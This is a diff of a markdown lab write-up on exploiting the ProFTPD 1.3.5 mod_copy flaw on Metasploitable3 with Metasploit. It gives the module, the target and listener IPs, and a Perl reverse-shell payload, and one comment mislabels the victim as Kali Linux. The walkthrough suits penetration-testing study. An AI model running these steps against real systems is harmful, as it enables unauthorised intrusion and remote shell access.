@@ -1,12 +1,12 @@
 # Metasploit Exploitation
 
-This document outlines the process of exploiting the IIS FTP service on Metasploitable3 using the Metasploit Framework.
+This document outlines the process of exploiting a **ProFTPD 1.3.5** server on Metasploitable3 using the `proftpd_modcopy_exec` exploit in Metasploit.
 
 ## Exploitation Steps
 
 ### 1. Starting Metasploit Framework
 
-Started the Metasploit Console:
+Launched the Metasploit Console:
 
 ```bash
 msfconsole
@@ -14,19 +14,19 @@ msfconsole
 
 ![attacker 1](./screenshots/attacker-1.png)
 
-### 2. Identifying Appropriate Exploit
+### 2. Selecting the Exploit
 
-Identified the appropriate exploit:
+Used the `proftpd_modcopy_exec` module targeting ProFTPD 1.3.5:
 
 ```bash
-use exploit/windows/ftp/ms09_053_ftpd_nlst
+use exploit/unix/ftp/proftpd_modcopy_exec
 ```
 
 ![attacker 2](./screenshots/attacker-2.png)
 
 ### 3. Configuring the Exploit
 
-Examined required options:
+Verified settings:
 
 ```bash
 show options
@@ -34,23 +34,22 @@ show options
 
 ![attacker 3](./screenshots/attacker-3.png)
 
-Set the required parameters:
+#### Set Parameters
 
 ```bash
-set RHOSTS 192.168.1.X  # Metasploitable3 IP
-set RPORT 21
+set RHOSTS 192.168.56.102   # Victim's IP (Kali Linux)
+set LHOST 192.168.56.101    # Attacker's IP (Kali Linux)
+set SITEPATH /var/www/html/
 ```
 
 ![attacker 4](./screenshots/attacker-4.png)
 
-### 4. Selecting and Configuring Payload
+### 4. Payload Configuration
 
-Set the payload:
+Selected a Perl-based reverse shell payload for reliability:
 
 ```bash
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.1.Y  # Kali Linux IP
-set LPORT 4444
+set payload cmd/unix/reverse_perl
 ```
 
 ![attacker 5](./screenshots/attacker-5.png)
@@ -63,4 +62,4 @@ Launched the exploit:
 exploit
 ```
 
-[Screenshot: metasploit_execute_exploit.png]
+![attacker 6](./screenshots/attacker-6.png)
